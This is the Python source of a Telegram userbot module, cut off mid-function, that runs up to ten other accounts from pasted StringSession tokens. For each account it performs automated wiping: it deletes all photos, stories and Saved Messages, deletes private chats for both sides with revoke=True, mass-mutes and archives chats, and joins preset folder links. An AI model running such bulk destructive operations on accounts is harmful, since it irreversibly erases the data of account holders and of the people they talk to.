__version__ = (1, 6, 0)
# meta developer: FireJester.t.me

import logging
import asyncio
import re
import time
import io
import random
import aiohttp

from datetime import datetime, timezone, timedelta

from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.tl.types import (
    Message,
    User,
    Channel,
    Chat,
    ChannelForbidden,
    ChatForbidden,
    DialogFilter,
    TextWithEntities,
    InputPeerNotifySettings,
    InputPhoto,
    InputPeerSelf,
)
from telethon.tl.functions.contacts import (
    GetContactsRequest,
    DeleteContactsRequest,
    BlockRequest,
)
from telethon.tl.functions.messages import (
    DeleteHistoryRequest,
    GetDialogFiltersRequest,
    UpdateDialogFilterRequest,
    ToggleDialogPinRequest,
    ReorderPinnedDialogsRequest,
    DeleteChatUserRequest,
    StartBotRequest,
)
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.photos import (
    GetUserPhotosRequest,
    DeletePhotosRequest,
    UploadProfilePhotoRequest,
)
from telethon.tl.functions.chatlists import (
    CheckChatlistInviteRequest,
    JoinChatlistInviteRequest,
)
from telethon.errors import (
    AuthKeyUnregisteredError,
    UserDeactivatedBanError,
    UserCreatorError,
    ChatIdInvalidError,
    ChannelPrivateError,
    FloodWaitError,
    BotMethodInvalidError,
)

from .. import loader, utils

logger = logging.getLogger(__name__)

STRING_SESSION_PATTERN = re.compile(r"(?<!\w)1[A-Za-z0-9_-]{200,}={0,2}(?!\w)")
MAX_SESSIONS = 10
TELEGRAM_ID = 777000
SPAMBOT_USERNAME = "SpamBot"
MAX_PHOTO_ITERATIONS = 20
FLOOD_EXTRA_MIN = 360
FLOOD_EXTRA_MAX = 720
MUTE_THRESHOLD = int(time.time()) + 86400


def get_full_name(entity):
    if isinstance(entity, (Channel, Chat)):
        return entity.title or "Unknown"
    first = getattr(entity, "first_name", "") or ""
    last = getattr(entity, "last_name", "") or ""
    return f"{first} {last}".strip() or "Unknown"


def get_owner_username(user_entity):
    username = getattr(user_entity, "username", None)
    if username:
        return username
    usernames_list = getattr(user_entity, "usernames", None)
    if usernames_list:
        for u in usernames_list:
            if getattr(u, "active", False):
                return u.username
    return None


def _is_already_muted(dialog):
    ns = getattr(getattr(dialog, "dialog", None), "notify_settings", None)
    if ns is None:
        return False
    mu = getattr(ns, "mute_until", None)
    if mu is None:
        return False
    if isinstance(mu, int):
        return mu > MUTE_THRESHOLD
    if hasattr(mu, "timestamp"):
        return mu.timestamp() > MUTE_THRESHOLD
    return False


class AccountFloodError(Exception):
    def __init__(self, seconds, method="unknown"):
        self.seconds = seconds
        self.method = method
        super().__init__(f"Account flood wait {seconds}s in {method}")


@loader.tds
class Manager(loader.Module):
    """Multi-account session manager with cleanup capabilities"""

    strings = {
        "name": "Manager",
        "line": "--------------------",
        "help": (
            "<b>Manager - Multi Account Manager</b>\n\n"
            "<code>.manage add [session]</code> - add session\n"
            "<code>.manage add long [session]</code> - add persistent session\n"
            "<code>.manage list</code> - list connected sessions\n"
            "<code>.manage remove [number]</code> - remove session by number\n"
            "<code>.manage folder [1/2/3] [link]</code> - set folder link\n"
            "<code>.manage ava [url]</code> - set avatar image url\n"
            "<code>.manage set [offset]</code> - set timezone (from -12 to 12)\n"
            "<code>.manage start</code> - start cleanup process\n"
        ),
        "session_added": (
            "<b>Session added</b>\n"
            "{line}\n"
            "Name: {name}\n"
            "ID: <code>{user_id}</code>\n"
            "Phone: <code>{phone}</code>\n"
            "Persistent: {persistent}\n"
            "Slot: {slot}/{max}\n"
            "{line}"
        ),
        "session_not_authorized": "<b>Error:</b> Session not authorized or invalid",
        "session_exists": "<b>Error:</b> This account is already added",
        "session_max": "<b>Error:</b> Maximum {max} sessions reached",
        "provide_session": "<b>Error:</b> Provide StringSession via argument or reply",
        "no_sessions": "<b>No sessions added</b>",
        "session_list": (
            "<b>Connected sessions ({count}/{max}):</b>\n"
            "{line}\n{sessions}\n{line}"
        ),
        "session_removed": "<b>Session #{num} removed</b>",
        "session_remove_invalid": "<b>Error:</b> Invalid session number",
        "processing": "<b>Processing... Please wait</b>",
        "processing_flood": "<b>Processing... FloodWait: resuming at {resume_time}</b>",
        "already_processing": "<b>Error:</b> Already processing, please wait",
        "success": "<b>Cleanup completed successfully</b>",
        "error_no_sessions": "<b>Error:</b> No sessions to process",
        "error_no_api": "<b>Error:</b> Set api_id and api_hash in module config first",
        "folder_set": "<b>Folder link {num} saved:</b>\n<code>{link}</code>",
        "folder_cleared": "<b>Folder link {num} cleared</b>",
        "folder_provide": "<b>Error:</b> Provide folder number (1-3) and link",
        "folder_invalid_num": "<b>Error:</b> Folder number must be 1, 2 or 3",
        "ava_set": "<b>Avatar URL saved:</b>\n<code>{url}</code>",
        "ava_cleared": "<b>Avatar URL cleared</b>",
        "ava_provide": "<b>Error:</b> Provide image URL",
        "timezone_set": "<b>Timezone set:</b> UTC{timezone_str}",
        "timezone_invalid": "<b>Error:</b> Invalid timezone. Use a number from -12 to 12",
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "api_id", 0, "Telegram API ID",
                validator=loader.validators.Integer(minimum=0),
            ),
            loader.ConfigValue(
                "api_hash", "", "Telegram API Hash",
                validator=loader.validators.Hidden(loader.validators.String()),
            ),
            loader.ConfigValue(
                "sessions_data", [], "Stored sessions (internal)",
                validator=loader.validators.Hidden(loader.validators.Series()),
            ),
            loader.ConfigValue(
                "folder_link_1", "", "Folder link #1",
                validator=loader.validators.Hidden(loader.validators.String()),
            ),
            loader.ConfigValue(
                "folder_link_2", "", "Folder link #2",
                validator=loader.validators.Hidden(loader.validators.String()),
            ),
            loader.ConfigValue(
                "folder_link_3", "", "Folder link #3",
                validator=loader.validators.Hidden(loader.validators.String()),
            ),
            loader.ConfigValue(
                "avatar_url", "", "Avatar image URL",
                validator=loader.validators.Hidden(loader.validators.String()),
            ),
            loader.ConfigValue(
                "timezone_offset", 3, "UTC offset (-12 to 12)",
                validator=loader.validators.Integer(minimum=-12, maximum=12),
            ),
        )
        self._clients = []
        self._sessions_runtime = []
        self._status_msg = None
        self._processing_lock = asyncio.Lock()
        self._flood_until = {}
        self._flood_log = []
        self._current_message = None

    def _tz(self):
        return timezone(timedelta(hours=self.config["timezone_offset"]))

    def _now_str(self):
        return datetime.now(self._tz()).strftime("%d.%m.%Y %H:%M")

    def _time_str(self, ts):
        return datetime.fromtimestamp(ts, tz=self._tz()).strftime("%H:%M:%S")

    def _datetime_str(self, ts):
        return datetime.fromtimestamp(ts, tz=self._tz()).strftime("%d.%m.%Y %H:%M:%S")

    def _tz_label(self, o):
        return f"+{o}" if o >= 0 else str(o)

    async def client_ready(self, client, db):
        self._client = client
        self._db = db
        self._me = await client.get_me()
        await self._restore_sessions()

    async def on_unload(self):
        for c in self._clients:
            try:
                await c.disconnect()
            except Exception:
                pass
        self._clients.clear()
        self._sessions_runtime.clear()

    def _get_api(self):
        a, h = self.config["api_id"], self.config["api_hash"]
        return (int(a), str(h)) if a and h else (None, None)

    async def _ec(self, c):
        if not c.is_connected():
            await c.connect()

    def _mark_flood(self, client, seconds, method="unknown", account_name="unknown"):
        extra = random.randint(FLOOD_EXTRA_MIN, FLOOD_EXTRA_MAX)
        total = seconds + extra
        resume_at = time.time() + total
        self._flood_until[id(client)] = resume_at
        self._flood_log.append({
            "account": account_name, "method": method,
            "flood_seconds": seconds, "extra_wait": extra, "total_wait": total,
            "timestamp": self._datetime_str(time.time()),
            "resume_at": self._datetime_str(resume_at),
        })
        logger.warning(
            f"[MANAGER] {account_name} flood {seconds}s+{extra}s in {method}"
        )

    def _is_flooded(self, c):
        d = self._flood_until.get(id(c))
        if d is None:
            return False
        if time.time() >= d:
            del self._flood_until[id(c)]
            return False
        return True

    def _flood_rem(self, c):
        d = self._flood_until.get(id(c))
        return max(0, d - time.time()) if d else 0

    async def _send_flood_file(self, an, method, secs, chat_id, topic_id):
        txt = (
            f"FLOOD WAIT REPORT\n"
            f"Date: {self._now_str()}\n"
            f"Account: {an}\nMethod: {method}\nFlood: {secs}s\n"
            f"{'=' * 40}\n\nAll events:\n"
        )
        for e in self._flood_log:
            txt += (
                f"\nAccount: {e['account']}\nMethod: {e['method']}\n"
                f"Flood: {e['flood_seconds']}s+{e['extra_wait']}s\n"
                f"Time: {e['timestamp']}\nResume: {e['resume_at']}\n{'-' * 30}\n"
            )
        f = io.BytesIO(txt.encode("utf-8"))
        f.name = "flood_report.txt"
        try:
            await self._client.send_file(chat_id, f, reply_to=topic_id)
        except Exception:
            pass

    async def _update_flood_status(self):
        if not self._status_msg:
            return
        fl = {c: d for c, d in self._flood_until.items() if time.time() < d}
        try:
            if fl:
                await utils.answer(self._status_msg,
                    self.strings["processing_flood"].format(
                        resume_time=self._time_str(min(fl.values()))))
            else:
                await utils.answer(self._status_msg, self.strings["processing"])
        except Exception:
            pass

    async def _sr(self, client, req, ctx="", an="unknown", retries=3):
        for att in range(retries):
            try:
                await self._ec(client)
                return await client(req)
            except FloodWaitError as e:
                self._mark_flood(client, e.seconds, ctx, an)
                if self._current_message:
                    tid = None
                    rt = getattr(self._current_message, "reply_to", None)
                    if rt:
                        tid = getattr(rt, "reply_to_top_id", None) or getattr(rt, "reply_to_msg_id", None)
                    await self._send_flood_file(an, ctx, e.seconds,
                        self._current_message.chat_id, tid)
                raise AccountFloodError(e.seconds, ctx)
            except (ConnectionError, OSError):
                await asyncio.sleep(2)
                try:
                    await self._ec(client)
                except Exception:
                    pass
            except Exception:
                raise
        raise Exception(f"Max retries: {ctx}")

    async def _connect_session(self, ss):
        aid, ah = self._get_api()
        if not aid:
            return None, "No API"
        c = None
        try:
            c = TelegramClient(StringSession(ss), api_id=aid, api_hash=ah)
            await c.connect()
            if not await c.is_user_authorized():
                await c.disconnect()
                return None, "Not authorized"
            return c, await c.get_me()
        except AuthKeyUnregisteredError:
            if c:
                try: await c.disconnect()
                except: pass
            return None, "Session revoked"
        except UserDeactivatedBanError:
            if c:
                try: await c.disconnect()
                except: pass
            return None, "Banned"
        except Exception as e:
            if c:
                try: await c.disconnect()
                except: pass
            return None, str(e)

    async def _restore_sessions(self):
        aid, _ = self._get_api()
        if not aid:
            return
        for entry in (self.config["sessions_data"] or []):
            ss = entry.get("session", "")
            if not ss:
                continue
            try:
                c, r = await self._connect_session(ss)
                if c is None:
                    continue
                self._sessions_runtime.append({
                    "session": ss, "user_id": r.id,
                    "name": get_full_name(r),
                    "phone": getattr(r, "phone", "Unknown") or "Hidden",
                    "persistent": entry.get("persistent", False),
                })
                self._clients.append(c)
            except Exception:
                pass

    def _save_sessions(self):
        self.config["sessions_data"] = [
            {"session": s["session"], "persistent": s.get("persistent", False),
             "user_id": s["user_id"], "name": s["name"], "phone": s["phone"]}
            for s in self._sessions_runtime
        ]

    def _find_ss(self, text):
        if not text:
            return None
        m = STRING_SESSION_PATTERN.search(text)
        return m.group(0) if m else None

    def _folder_hash(self, link):
        if not link:
            return None
        for sep in ("addlist/", "slug="):
            if sep in link:
                return link.split(sep)[-1].split("?" if sep == "addlist/" else "&")[0].strip() or None
        return None

    def _peer_id(self, peer):
        for a in ("channel_id", "chat_id", "user_id"):
            if hasattr(peer, a):
                return getattr(peer, a)
        return None

    def _folder_links(self):
        return [v.strip() for k in ("folder_link_1", "folder_link_2", "folder_link_3")
                if (v := self.config[k]) and v.strip()]

    async def _get_filters(self, client, an="unknown"):
        try:
            r = await self._sr(client, GetDialogFiltersRequest(), "GetFilters", an)
            fs = getattr(r, "filters", r)
            return {f.id for f in fs if hasattr(f, "id")}, fs
        except Exception:
            return set(), []

    def _free_fid(self, used):
        for i in range(2, 256):
            if i not in used:
                return i
        return None

    def _chats_in_folders(self, filters):
        ids = set()
        for f in filters:
            for a in ("include_peers", "pinned_peers"):
                for p in (getattr(f, a, None) or []):
                    pid = self._peer_id(p)
                    if pid:
                        ids.add(pid)
        return ids

    def _find_folder(self, filters, title):
        for f in filters:
            if not isinstance(f, DialogFilter) or not hasattr(f, "title"):
                continue
            t = f.title
            if hasattr(t, "text"):
                t = t.text
            if isinstance(t, str) and t.lower() == title.lower():
                return f
        return None

    def _clone_filter(self, f, **kw):
        fields = {
            "id": f.id, "title": f.title,
            "pinned_peers": list(f.pinned_peers or []),
            "include_peers": list(f.include_peers or []),
            "exclude_peers": list(f.exclude_peers or []),
        }
        for flag in ("contacts", "non_contacts", "groups", "broadcasts", "bots",
                      "exclude_muted", "exclude_read", "exclude_archived"):
            v = getattr(f, flag, None)
            if v is not None:
                fields[flag] = v
        for fld in ("emoticon", "color"):
            v = getattr(f, fld, None)
            if v is not None:
                fields[fld] = v
        fields.update(kw)
        return DialogFilter(**fields)

    async def _mute_peer(self, client, peer, ctx="", an="unknown"):
        await self._sr(client, UpdateNotifySettingsRequest(
            peer=peer,
            settings=InputPeerNotifySettings(
                show_previews=False, silent=True, mute_until=2**31 - 1,
            ),
        ), ctx, an)

    async def _mute_and_archive(self, client, entity, already_muted=False, an="unknown"):
        try:
            if not already_muted:
                await self._ec(client)
                await self._mute_peer(client, entity, "MuteArchive", an)
                await asyncio.sleep(0.5)
            await self._ec(client)
            await client.edit_folder(entity, 1)
            return True
        except AccountFloodError:
            raise
        except FloodWaitError as e:
            self._mark_flood(client, e.seconds, "mute_and_archive", an)
            raise AccountFloodError(e.seconds, "mute_and_archive")
        except Exception as e:
            logger.error(f"[MANAGER] Mute/archive: {e}")
            return False

    async def _start_spambot(self, client, an="unknown"):
        errors = []
        try:
            await self._ec(client)
            bot = await client.get_entity(SPAMBOT_USERNAME)
            bi = await client.get_input_entity(bot)
            try:
                await self._sr(client, StartBotRequest(
                    bot=bi, peer=bi,
                    random_id=random.randint(1, 2**63 - 1),
                    start_param="start",
                ), "StartSpamBot", an)
                return True, errors
            except (BotMethodInvalidError, Exception):
                pass
            try:
                await self._ec(client)
                await client.send_message(bot, "/start")
                return True, errors
            except Exception as e:
                errors.append(f"/start: {e}")
                return False, errors
        except AccountFloodError:
            raise
        except Exception as e:
            errors.append(f"SpamBot: {e}")
            return False, errors

    async def _match_owner(self, client, me, an="unknown"):
        errors = []
        try:
            ou = get_owner_username(self._me)
            if not ou:
                errors.append("Owner no username")
                return False, errors
            await self._ec(client)
            try:
                resolved = await client.get_entity(ou)
            except Exception as e:
                errors.append(f"Resolve @{ou}: {e}")
                return False, errors
            try:
                await self._ec(client)
                await client.send_message(resolved, "successfully matched owner")
            except Exception as e:
                errors.append(f"Send match: {e}")
                return False, errors
            await asyncio.sleep(3)
            try:
                await self._client(DeleteHistoryRequest(
                    peer=me.id, max_id=0, just_clear=True, revoke=False,
                ))
            except Exception as e:
                errors.append(f"Owner clear: {e}")
            return True, errors
        except Exception as e:
            errors.append(f"Match: {e}")
            return False, errors

    async def _get_spambot_id(self, client):
        try:
            await self._ec(client)
            return (await client.get_entity(SPAMBOT_USERNAME)).id
        except Exception:
            return None

    async def _get_admin_chats(self, client):
        chs, grs = [], []
        try:
            await self._ec(client)
            async for d in client.iter_dialogs():
                e = d.entity
                if isinstance(e, (ChannelForbidden, ChatForbidden)):
                    continue
                if isinstance(e, Channel):
                    if not e.admin_rights and not e.creator:
                        continue
                    (chs if getattr(e, "broadcast", False) else grs).append(e)
                elif isinstance(e, Chat) and (e.admin_rights or getattr(e, "creator", False)):
                    grs.append(e)
        except Exception as e:
            logger.error(f"[MANAGER] Admin chats: {e}")
        return chs, grs

    async def _remove_saved_from_all_folders(self, client, me_id, an="unknown"):
        removed = []
        try:
            _, filters = await self._get_filters(client, an)
            for f in filters:
                if not isinstance(f, DialogFilter) or not hasattr(f, "include_peers"):
                    continue
                has = False
                ni, np_ = [], []
                for p in f.include_peers:
                    if self._peer_id(p) == me_id:
                        has = True
                    else:
                        ni.append(p)
                for p in (f.pinned_peers or []):
                    if self._peer_id(p) == me_id:
                        has = True
                    else:
                        np_.append(p)
                if has:
                    t = f.title
                    if hasattr(t, "text"):
                        t = t.text
                    try:
                        await self._sr(client, UpdateDialogFilterRequest(
                            id=f.id, filter=self._clone_filter(f, pinned_peers=np_, include_peers=ni),
                        ), f"RemSaved_{f.id}", an)
                        removed.append(f"'{t}' (ID:{f.id})")
                    except Exception as e:
                        logger.warning(f"[MANAGER] RemSaved {f.id}: {e}")
                    await asyncio.sleep(0.5)
            return True, removed
        except Exception as e:
            logger.error(f"[MANAGER] RemSaved: {e}")
            return False, removed

    async def _clear_saved(self, client, an="unknown"):
        errors = []
        try:
            await self._ec(client)
            await client(DeleteHistoryRequest(
                peer=InputPeerSelf(), max_id=0, just_clear=True, revoke=False,
            ))
        except Exception as e:
            errors.append(f"Clear: {e}")
        try:
            await self._ec(client)
            await client.send_message("me", f"successfully cleared ({self._now_str()})")
        except Exception as e:
            errors.append(f"Confirm: {e}")
        return errors

    async def _join_folder(self, client, link, an="unknown"):
        fh = self._folder_hash(link)
        if not fh:
            return False, "Bad link", []
        try:
            ch = await self._sr(client, CheckChatlistInviteRequest(slug=fh), "CheckList", an)
            pl = list(ch.peers)
            await self._sr(client, JoinChatlistInviteRequest(slug=fh, peers=pl), "JoinList", an)
            return True, None, [self._peer_id(p) for p in pl if self._peer_id(p)]
        except AccountFloodError:
            raise
        except Exception as e:
            if "already" in str(e).lower():
                try:
                    await self._sr(client, JoinChatlistInviteRequest(slug=fh, peers=[]),
                                   "JoinRefresh", an)
                    return True, "Already", []
                except AccountFloodError:
                    raise
                except Exception as e2:
                    return False, str(e2), []
            return False, str(e), []

    async def _mute_folder_chats(self, client, pids, an="unknown"):
        muted, errors = [], []
        for pid in pids:
            try:
                await self._ec(client)
                ent = await client.get_entity(pid)
                await self._mute_peer(client, ent, f"MuteF_{pid}", an)
                await asyncio.sleep(0.3)
                await self._ec(client)
                await client.edit_folder(ent, 1)
                muted.append(f"{get_full_name(ent) if isinstance(ent, (User, Channel, Chat)) else pid} ({pid})")
                await asyncio.sleep(0.5)
            except AccountFloodError:
                raise
            except FloodWaitError as e:
                self._mark_flood(client, e.seconds, "mute_folder", an)
                raise AccountFloodError(e.seconds, "mute_folder")
            except Exception as e:
                errors.append(f"MuteF {pid}: {e}")
        return muted, errors

    async def _update_folder(self, client, folder, entities, an="unknown"):
        try:
            existing = {self._peer_id(p) for p in folder.include_peers}
            np_, added = list(folder.include_peers), []
            for ent in entities:
                if ent.id not in existing:
                    try:
                        await self._ec(client)
                        np_.append(await client.get_input_entity(ent))
                        existing.add(ent.id)
                        added.append(ent)
                    except Exception:
                        pass
            if not added:
                return True, []
            await self._sr(client, UpdateDialogFilterRequest(
                id=folder.id, filter=self._clone_filter(folder, include_peers=np_),
            ), "UpdFolder", an)
            return True, added
        except Exception as e:
            logger.error(f"[MANAGER] UpdFolder: {e}")
            return False, []

    async def _create_folder(self, client, fid, title, peers, an="unknown"):
        try:
            ips = []
            for p in peers:
                try:
                    await self._ec(client)
                    ips.append(await client.get_input_entity(p))
                except Exception:
                    pass
            await self._sr(client, UpdateDialogFilterRequest(id=fid, filter=DialogFilter(
                id=fid, title=TextWithEntities(text=title, entities=[]),
                pinned_peers=[], include_peers=ips, exclude_peers=[],
            )), "CreateFolder", an)
            return True
        except Exception as e:
            logger.error(f"[MANAGER] CreateFolder '{title}': {e}")
            return False

    async def _mute_unmuted_archived(self, client, excluded_ids, an="unknown"):
        muted, skipped, errors = 0, 0, []
        try:
            await self._ec(client)
            dialogs = await client.get_dialogs(folder=1, limit=None)
            for d in dialogs:
                ent = d.entity
                eid = getattr(ent, "id", None)
                if eid and eid in excluded_ids:
                    continue
                if isinstance(ent, (ChannelForbidden, ChatForbidden)):
                    continue
                if _is_already_muted(d):
                    skipped += 1
                    continue
                try:
                    await self._mute_peer(client, ent, f"MuteArch_{eid}", an)
                    muted += 1
                    await asyncio.sleep(0.3)
                except AccountFloodError:
                    raise
                except Exception as e:
                    errors.append(f"MuteArch {eid}: {e}")
        except AccountFloodError:
            raise
        except Exception as e:
            errors.append(f"MuteArch iter: {e}")
        return muted, skipped, errors

    async def _archive_non_excluded(self, client, excluded_ids, an="unknown"):
        archived, skipped, errors = [], 0, []
        try:
            await self._ec(client)
            dialogs = await client.get_dialogs()
            for d in dialogs:
                if d.archived:
                    skipped += 1
                    continue
                ent = d.entity
                eid = getattr(ent, "id", None)
                if eid and eid in excluded_ids:
                    continue
                if isinstance(ent, (ChannelForbidden, ChatForbidden)):
                    continue
                already_muted = _is_already_muted(d)
                try:
                    ok = await self._mute_and_archive(client, ent, already_muted, an)
                    name = get_full_name(ent) if isinstance(ent, (User, Channel, Chat)) else str(eid)
                    if ok:
                        archived.append(f"{name} ({eid})")
                except AccountFloodError:
                    raise
                except Exception as e:
                    errors.append(f"Arch {eid}: {e}")
                await asyncio.sleep(0.5)
        except AccountFloodError:
            raise
        except Exception as e:
            errors.append(f"Arch iter: {e}")
        return archived, skipped, errors

    async def _pin_and_order(self, client, me_id, owner_id, sbid, an="unknown"):
        errors = []
        order = [TELEGRAM_ID]
        if sbid:
            order.append(sbid)
        order.append(me_id)
        if owner_id and owner_id not in order:
            order.append(owner_id)

        pinned = set()
        try:
            for d in await client.get_dialogs(limit=30):
                if d.pinned and (eid := getattr(d.entity, "id", None)):
                    pinned.add(eid)
        except Exception:
            pass

        for uid in order:
            if uid in pinned:
                continue
            try:
                await self._ec(client)
                await self._sr(client, ToggleDialogPinRequest(
                    peer=await client.get_input_entity(uid), pinned=True,
                ), f"Pin_{uid}", an)
            except AccountFloodError:
                raise
            except Exception as e:
                errors.append(f"Pin {uid}: {e}")
            await asyncio.sleep(0.5)

        try:
            ops = []
            for uid in order:
                try:
                    await self._ec(client)
                    ops.append(await client.get_input_entity(uid))
                except Exception:
                    pass
            if ops:
                await self._sr(client, ReorderPinnedDialogsRequest(
                    folder_id=0, order=ops, force=True,
                ), "Reorder", an)
        except AccountFloodError:
            raise
        except Exception as e:
            errors.append(f"Reorder: {e}")
        return errors

    async def _get_all_stories(self, client, func, an="unknown", **kw):
        stories, oid = [], 0
        while True:
            try:
                r = await self._sr(client, func(
                    peer=types.InputPeerSelf(), offset_id=oid, limit=100, **kw,
                ), "GetStories", an)
            except Exception:
                break
            if not r.stories:
                break
            stories.extend(r.stories)
            oid = r.stories[-1].id
            if len(r.stories) < 100:
                break
        return stories

    async def _del_stories_albums(self, client, an="unknown"):
        da, ds, errs = [], 0, []
        try:
            r = await self._sr(client, functions.stories.GetAlbumsRequest(
                peer=types.InputPeerSelf(), hash=0,
            ), "GetAlbums", an)
            for alb in getattr(r, "albums", []):
                try:
                    ss = []
                    off = 0
                    while True:
                        try:
                            ar = await self._sr(client, functions.stories.GetAlbumStoriesRequest(
                                peer=types.InputPeerSelf(), album_id=alb.album_id,
                                offset=off, limit=100,
                            ), f"AlbStories_{alb.album_id}", an)
                        except Exception:
                            break
                        if not ar.stories:
                            break
                        ss.extend(ar.stories)
                        off += len(ar.stories)
                        if len(ar.stories) < 100:
                            break
                    for s in ss:
                        try:
                            await self._sr(client, functions.stories.DeleteStoriesRequest(
                                peer=types.InputPeerSelf(), id=[s.id],
                            ), f"DelSt_{s.id}", an)
                            ds += 1
                            await asyncio.sleep(0.3)
                        except AccountFloodError:
                            raise
                        except Exception as e:
                            errs.append(f"DelSt {s.id}: {e}")
                    try:
                        await self._sr(client, functions.stories.DeleteAlbumRequest(
                            peer=types.InputPeerSelf(), album_id=alb.album_id,
                        ), f"DelAlb_{alb.title}", an)
                        da.append(f"{alb.title} ({len(ss)})")
                    except AccountFloodError:
                        raise
                    except Exception as e:
                        errs.append(f"DelAlb '{alb.title}': {e}")
                except AccountFloodError:
                    raise
                except Exception as e:
                    errs.append(f"Album: {e}")
        except AccountFloodError:
            raise
        except Exception as e:
            errs.append(f"Albums: {e}")

        for getter in (functions.stories.GetPinnedStoriesRequest,
                        functions.stories.GetStoriesArchiveRequest):
            try:
                for s in await self._get_all_stories(client, getter, an):
                    try:
                        await self._sr(client, functions.stories.DeleteStoriesRequest(
                            peer=types.InputPeerSelf(), id=[s.id],
                        ), f"DelSt_{s.id}", an)
                        ds += 1
                        await asyncio.sleep(0.3)
                    except AccountFloodError:
                        raise
                    except Exception as e:
                        errs.append(f"DelSt {s.id}: {e}")
            except AccountFloodError:
                raise
            except Exception as e:
                errs.append(f"Stories: {e}")
        return da, ds, errs

    async def _del_photos(self, client, me, an="unknown"):
        dc, errs = 0, []
        try:
            for _ in range(MAX_PHOTO_ITERATIONS):
                r = await self._sr(client, GetUserPhotosRequest(
                    user_id=me, offset=0, max_id=0, limit=100,
                ), "GetPhotos", an)
                if not r.photos:
                    break
                ips = [InputPhoto(id=p.id, access_hash=p.access_hash,
                                   file_reference=p.file_reference) for p in r.photos]
                try:
                    await self._sr(client, DeletePhotosRequest(id=ips), "DelPhotos", an)
                    dc += len(ips)
                except AccountFloodError:
                    raise
                except Exception:
                    for ip in ips:
                        try:
                            await self._sr(client, DeletePhotosRequest(id=[ip]),
                                           f"DelPh_{ip.id}", an)
                            dc += 1
                        except AccountFloodError:
                            raise
                        except Exception as e2:
                            errs.append(f"Ph {ip.id}: {e2}")
                        await asyncio.sleep(0.2)
                if len(r.photos) < 100:
                    break
                await asyncio.sleep(0.3)
        except AccountFloodError:
            raise
        except Exception as e:
            errs.append(f"Photos: {e}")
        return dc, errs

    async def _set_avatar(self, client, url, an="unknown"):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url) as r:
                    if r.status != 200:
                        return False, f"HTTP {r.status}"
                    data = await r.read()
            if not data:
                return False, "Empty"
            await self._ec(client)
            up = await client.upload_file(io.BytesIO(data), file_name="avatar.jpg")
            await self._sr(client, UploadProfilePhotoRequest(file=up), "SetAva", an)
            return True, None
        except AccountFloodError:
            raise
        except Exception as e:
            return False, str(e)

    async def _process_account(self, client, me, an="unknown"):
        sm, dt = [], []
        oid = self._me.id
        sbid = await self._get_spambot_id(client)
        excl = {me.id, oid, TELEGRAM_ID}
        if sbid:
            excl.add(sbid)

        dt.append(f"=== Account: {an} (ID:{me.id}) ===\n")

        # Step 0: Match owner
        ok, err = await self._match_owner(client, me, an)
        sm.append(f"Match owner: {'OK' if ok else 'ERR'}")
        dt.append("\n--- Match owner ---")
        for e in err:
            dt.append(f"  {e}")
        if ok:
            dt.append(f"  Matched (owner:{oid})")

        # Step 0.5: SpamBot
        ok, err = await self._start_spambot(client, an)
        sm.append(f"SpamBot: {'OK' if ok else 'ERR'}")
        dt.append("\n--- SpamBot ---")
        for e in err:
            dt.append(f"  {e}")
        await asyncio.sleep(2)
        nsb = await self._get_spambot_id(client)
        if nsb:
            sbid = nsb
            excl.add(sbid)

        # Step 1: Mute unmuted archived (with check, no false mutes)
        mc, sk, merr = await self._mute_unmuted_archived(client, excl, an)
        sm.append(f"Mute archived: {mc} muted, {sk} skip")
        dt.append(f"\n--- Mute archived: {mc} muted, {sk} already ---")
        for e in merr:
            dt.append(f"  {e}")

        # Step 2: Stories/albums
        da, ds, serr = await self._del_stories_albums(client, an)
        sm.append(f"Albums:{len(da)} Stories:{ds}")
        dt.append(f"\n--- Albums({len(da)}) Stories({ds}) ---")
        for a in da:
            dt.append(f"  {a}")
        for e in serr:
            dt.append(f"  {e}")

        # Step 3: Photos
        pc, perr = await self._del_photos(client, me, an)
        sm.append(f"Photos:{pc}")
        dt.append(f"\n--- Photos:{pc} ---")
        for e in perr:
            dt.append(f"  {e}")

        # Step 4: Join folders
        flinks = self._folder_links()
        all_fp = []
        if flinks:
            for i, fl in enumerate(flinks, 1):
                ok, err, fps = await self._join_folder(client, fl, an)
                all_fp.extend(fps)
                sm.append(f"Folder#{i}: {'OK' if ok else 'ERR'}")
                dt.append(f"\n--- Folder#{i}: {err or 'Joined'} ({len(fps)} chats) ---")
                if i < len(flinks):
                    await asyncio.sleep(10)

        # Step 5: Admin folders
        chs, grs = await self._get_admin_chats(client)
        uids, efs = await self._get_filters(client, an)
        for label, ents in (("channels", chs), ("groups", grs)):
            ef = self._find_folder(efs, label)
            if ef:
                if ents:
                    ok, added = await self._update_folder(client, ef, ents, an)
                    sm.append(f"'{label}': {'OK' if ok else 'ERR'} +{len(added)}")
                    dt.append(f"\n--- '{label}' (ID:{ef.id}) +{len(added)} ---")
                    for a in added:
                        dt.append(f"  +{getattr(a, 'title', '?')}")
            else:
                fid = self._free_fid(uids)
                if fid and ents:
                    ok = await self._create_folder(client, fid, label, ents, an)
                    uids.add(fid)
                    sm.append(f"'{label}': {'Created' if ok else 'ERR'}")
                    dt.append(f"\n--- '{label}' (ID:{fid}) {len(ents)} chats ---")

        # Step 6: Mute+archive folder chats
        if all_fp:
            m, merr = await self._mute_folder_chats(client, all_fp, an)
            sm.append(f"Folder mute:{len(m)}")
            dt.append(f"\n--- Folder mute ({len(m)}) ---")
            for x in m:
                dt.append(f"  {x}")
            for e in merr:
                dt.append(f"  ERR: {e}")

        # Step 7: Remove Saved from folders
        await asyncio.sleep(0.5)
        ok, rem = await self._remove_saved_from_all_folders(client, me.id, an)
        sm.append(f"RemSaved: {len(rem)}")
        dt.append(f"\n--- RemSaved: {len(rem)} ---")
        for r in rem:
            dt.append(f"  {r}")

        # Step 8: Clear Saved
        cerr = await self._clear_saved(client, an)
        sm.append(f"ClearSaved: {'OK' if not cerr else 'Partial'}")
        dt.append("\n--- ClearSaved ---")
        for e in cerr:
            dt.append(f"  {e}")

        # Step 9: Delete PMs + block
        blocked, deleted, s9e = [], [], []
        try:
            await self._ec(client)
            for d in await client.get_dialogs():
                ent = d.entity
                if not isinstance(ent, User):
                    continue
                uid = ent.id
                if uid in excl or getattr(ent, "is_self", False):
                    continue
                try:
                    await self._sr(client, DeleteHistoryRequest(
                        peer=ent, max_id=0, revoke=True,
                    ), f"DelH_{uid}", an)
                    deleted.append(f"{get_full_name(ent)} ({uid})")
